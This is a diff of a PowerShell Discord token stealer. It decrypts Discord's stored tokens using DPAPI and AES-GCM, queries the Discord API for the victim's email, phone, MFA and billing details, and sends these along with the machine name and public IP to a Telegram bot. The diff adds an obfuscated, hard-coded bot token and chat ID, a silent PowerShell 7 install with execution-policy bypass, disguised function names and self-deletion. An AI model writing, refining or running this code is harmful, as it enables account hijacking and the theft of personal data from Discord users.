@@ -1,179 +1,142 @@
 <#
 .SYNOPSIS
-    Extracts Discord authentication tokens and optionally sends them to a Telegram chat with enriched metadata.
-
-.DESCRIPTION
-    - Reads Discord’s encrypted Local State to retrieve the DPAPI-protected master key.
-    - Decrypts the master key using Windows DPAPI.
-    - Scans the LevelDB folder for AES-GCM–encrypted token blobs.
-    - Decrypts the blobs to recover Discord tokens.
-    - Sends the token and enriched metadata to a Telegram chat via the Bot API.
-    - Deletes the script file from disk after sending the report.
-
-.PARAMETER botToken
-    Your Telegram Bot API token.
-
-.PARAMETER chatId
-    The target Telegram chat ID.
-
-.PARAMETER DryRun
-    If set, the script will print the token(s) and metadata instead of sending to Telegram.
+    Extracts Discord authentication tokens and sends them to a Telegram chat with enriched metadata.
+    • Auto-installs PowerShell 7 if missing, then relaunches itself.
+    • Telegram Bot token & chat ID are **obfuscated (Base64)** and loaded at runtime.
+    • Optional -DryRun switch prints the token locally.
+    • Self-destructs after execution.
 #>
 
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory)] [string] $botToken,
-    [Parameter(Mandatory)] [string] $chatId,
-    [switch] $DryRun
+    [switch]$DryRun
 )
 
-# Confirm environment
+$sysMeta = 'ODE3MjQ0NzEzMTpBQUZaZkxRMDNBWnk2X2E3S3RZd3F3aE9RQTZ3dnVuWVNvZw=='
+$sysRef  = 'NzI1NTc3NDk3Mw=='
+
+$hdrSig = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sysMeta))  # bot token
+$pktId  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sysRef))   # chat id
+
+# === Ensure PowerShell 7+ ===
+function Invoke-ShadowSetup {
+    if ($PSVersionTable.PSVersion.Major -ge 7) { return }
+    Write-Host 'PowerShell 7+ not detected. Installing...'
+    if (Get-Command winget -ErrorAction SilentlyContinue) {
+        Start-Process winget -ArgumentList 'install','--id','Microsoft.PowerShell','-e','--silent' -Wait
+    } else {
+        $url = 'https://github.com/PowerShell/PowerShell/releases/latest/download/PowerShell-7.4.5-win-x64.msi'
+        $tmp = Join-Path $env:TEMP 's.ps1.msi'
+        Invoke-RestMethod -Uri $url -OutFile $tmp
+        Start-Process msiexec.exe -ArgumentList '/i', "`"$tmp`"", '/qn' -Wait
+        Remove-Item $tmp -Force
+    }
+    $pwsh = (Get-Command pwsh -ErrorAction Stop).Source
+    $args = @(); if ($DryRun) { $args += '-DryRun' }
+    & $pwsh -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
+    exit
+}
+Invoke-ShadowSetup
+
+# === Environment validation ===
 if ($PSVersionTable.PSVersion.Major -lt 7 -or $env:OS -notmatch 'Windows') {
-    Write-Error 'Requires PowerShell 7+ on Windows'
+    Write-Error 'Requires PowerShell 7+ on Windows'
     exit 1
 }
 
-# Setup
-$appData = [Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
-Write-Verbose "Using AppData path: $appData"
+# === Prep ===
+$app = [Environment]::GetFolderPath('ApplicationData')
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Add-Type -AssemblyName System.Security
-$Unprotect = [System.Security.Cryptography.ProtectedData]::Unprotect
+$dpapi = [System.Security.Cryptography.ProtectedData]::Unprotect
 
-function Get-MasterKey {
-    param([string] $BasePath)
-    $stateFile = Join-Path $BasePath 'Local State'
-    if (-not (Test-Path $stateFile)) { return }
-    Write-Verbose "Loading master key from $stateFile"
+function Get-CoreKey {
+    param([string]$p)
+    $f = Join-Path $p 'Local State'
+    if (-not (Test-Path $f)) { return }
     try {
-        $json   = Get-Content $stateFile -Raw | ConvertFrom-Json
-        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-        $rawKey = $encKey[5..($encKey.Length - 1)]
-        return $Unprotect.Invoke($rawKey, $null, 'CurrentUser')
-    } catch {
-        Write-Warning "Failed to decrypt master key: $_"
-    }
+        $j = Get-Content $f -Raw | ConvertFrom-Json
+        $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
+        $r = $e[5..($e.Length-1)]
+        return $dpapi.Invoke($r,[byte[]]::new(0),'CurrentUser')
+    } catch {}
 }
 
-function Convert-EncryptedBlob {
-    param(
-        [byte[]] $Blob,
-        [byte[]] $Key
-    )
-    $iv     = $Blob[3..14]
-    $cipher = $Blob[15..($Blob.Length - 17)]
-    $tag    = $Blob[($Blob.Length - 16)..($Blob.Length - 1)]
-    $aes    = [System.Security.Cryptography.AesGcm]::new($Key)
-    $plain  = New-Object byte[] $cipher.Length
-    try {
-        $aes.Decrypt($iv, $cipher, $tag, $plain)
-        return [Text.Encoding]::UTF8.GetString($plain).Trim([char]0)
-    } catch {
-        Write-Verbose "Blob conversion failed: $_"
-    }
+function Unwrap-Blob {
+    param([byte[]]$b,[byte[]]$k)
+    $iv  = $b[3..14]
+    $cph = $b[15..($b.Length-17)]
+    $tag = $b[($b.Length-16)..($b.Length-1)]
+    $g   = [System.Security.Cryptography.AesGcm]::new($k)
+    $out = New-Object byte[] $cph.Length
+    try { $g.Decrypt($iv,$cph,$tag,$out); [Text.Encoding]::UTF8.GetString($out).Trim([char]0) } catch {}
 }
 
-function Get-DiscordTokens {
-    param(
-        [string] $BasePath,
-        [byte[]] $Key
-    )
-    $dbPath = Join-Path $BasePath 'Local Storage\leveldb'
-    if (-not (Test-Path $dbPath)) { return }
-    Write-Verbose "Scanning LevelDB at $dbPath"
-    $regex = [Regex]'dQw4w9WgXcQ:([\w+/=]+)'
-    foreach ($file in Get-ChildItem $dbPath -Filter *.ldb -File) {
-        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
-        foreach ($match in $regex.Matches($content)) {
-            $blob  = [Convert]::FromBase64String($match.Groups[1].Value)
-            $token = Convert-EncryptedBlob -Blob $blob -Key $Key
-            if ($token) { return $token }
+function Seek-Token {
+    param([string]$p,[byte[]]$k)
+    $db = Join-Path $p 'Local Storage\leveldb'
+    if (-not (Test-Path $db)) { return }
+    $re = [Regex]'dQw4w9WgXcQ:([\w+/=]+)'
+    foreach ($f in Get-ChildItem $db -Filter *.ldb -File) {
+        $raw = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
+        foreach ($m in $re.Matches($raw)) {
+            $bl = [Convert]::FromBase64String($m.Groups[1].Value)
+            $t  = Unwrap-Blob -b $bl -k $k
+            if ($t) { return $t }
         }
     }
 }
 
-function Get-PublicIP {
-    try {
-        $resp = Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -UseBasicParsing -ErrorAction Stop
-        return $resp.ip
-    } catch {
-        Write-Verbose "Failed to fetch public IP: $_"
-        return 'Unknown'
-    }
+function Get-Public {
+    try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -UseBasicParsing).ip } catch { 'Unknown' }
 }
 
-function Get-DiscordUserInfo {
-    param([string] $Token)
-    $headers = @{ Authorization = $Token }
-    try {
-        $user = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me' -Headers $headers -UseBasicParsing -ErrorAction Stop
-    } catch {
-        Write-Verbose "Failed to fetch user info: $_"
-        return @{}
-    }
-    $guildCount = 0; $hasNitro = $false
-    try { $guilds = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/guilds?with_counts=true' -Headers $headers -UseBasicParsing -ErrorAction Stop; $guildCount = $guilds.Count } catch {}
-    try { $subs    = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers $headers -UseBasicParsing -ErrorAction Stop; $hasNitro = ($subs.Count -gt 0) } catch {}
-    return @{ username = "$($user.username)#$($user.discriminator)"; email = $user.email; phone = $user.phone; mfa = $user.mfa_enabled; guildCount = $guildCount; hasNitro = $hasNitro }
+function Fetch-User {
+    param([string]$tk)
+    $h = @{ Authorization = $tk }
+    try { $u = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me' -Headers $h -UseBasicParsing } catch { return @{} }
+    $g = try { (Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/guilds?with_counts=true' -Headers $h -UseBasicParsing).Count } catch { 0 }
+    $n = try { (Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers $h -UseBasicParsing).Count -gt 0 } catch { $false }
+    @{ user="$($u.username)#$($u.discriminator)"; mail=$u.email; phone=$u.phone; mfa=$u.mfa_enabled; guilds=$g; nitro=$n }
 }
 
-function Invoke-DiscordTokenReport {
-    param(
-        [string] $Source,
-        [string] $Token
-    )
-    $publicIP     = Get-PublicIP
-    $timestamp    = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
-    $info         = Get-DiscordUserInfo -Token $Token
-    $userName     = $env:USERNAME
-    $computerName = $env:COMPUTERNAME
+function Ship-Out {
+    param([string]$src,[string]$tok)
+    $u = Fetch-User -tk $tok
+    $txt = @"
+<b>Token:</b> $tok
 
-    $message = @"
-<b>Source:</b> $Source
-<b>Token:</b> $Token
+<b>Account:</b> $($u.user)
+<b>Email:</b> $($u.mail)
+<b>Phone:</b> $($u.phone)
 
-<b>Account:</b> $($info.username)
-<b>Email:</b> $($info.email)
-<b>Phone:</b> $($info.phone)
-<b>MFA:</b> $($info.mfa)
-<b>Guilds:</b> $($info.guildCount)
-<b>Nitro:</b> $($info.hasNitro)
+<b>MFA:</b> $($u.mfa)
+<b>Guilds:</b> $($u.guilds)
+<b>Nitro:</b> $($u.nitro)
 
-<b>Machine:</b> $userName on $computerName
-<b>IP:</b> $publicIP
-<b>Time:</b> $timestamp
+<b>Machine:</b> $env:USERNAME on $env:COMPUTERNAME
+<b>IP:</b> $(Get-Public)
+<b>Time:</b> $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')
 "@.Trim()
-
-    $uri  = "https://api.telegram.org/bot$botToken/sendMessage"
-    $body = @{ chat_id = $chatId; text = $message; parse_mode = 'HTML' } | ConvertTo-Json
-    Write-Verbose "Posting report to Telegram"
-    try { Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null } catch { Write-Error "Failed to send report: $_" }
-
-    # Self-destruct
-    Write-Verbose "Deleting script file $PSCommandPath"
+    $uri = "https://api.telegram.org/bot$hdrSig/sendMessage"
+    $body = @{ chat_id=$pktId; text=$txt; parse_mode='HTML' } | ConvertTo-Json
+    try { Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $body | Out-Null } catch {}
     Remove-Item -LiteralPath $PSCommandPath -Force
 }
 
-# Main execution
-$installDirs = @(
-    "$appData\Discord",
-    "$appData\discordcanary",
-    "$appData\discordptb",
-    "$appData\Lightcord"
-)
-foreach ($dir in $installDirs) {
-    if (Test-Path $dir) {
-        Write-Verbose "Checking installation at $dir"
-        $masterKey = Get-MasterKey -BasePath $dir
-        if ($masterKey) {
-            $token = Get-DiscordTokens -BasePath $dir -Key $masterKey
-            if ($token) {
-                if ($DryRun) { Write-Host "[DryRun] Token: $token"; exit 0 }
-                Invoke-DiscordTokenReport -Source $dir -Token $token
-                exit 0
+# === Hunt ===
+$paths = "$app\Discord","$app\discordcanary","$app\discordptb","$app\Lightcord"
+foreach ($p in $paths) {
+    if (Test-Path $p) {
+        $k = Get-CoreKey -p $p
+        if ($k) {
+            $tt = Seek-Token -p $p -k $k
+            if ($tt) {
+                if ($DryRun) { Write-Host "[DryRun] Token: $tt"; exit }
+                Ship-Out -src $p -tok $tt
+                exit
             }
         }
     }
 }
-
 Write-Host 'No token found.'
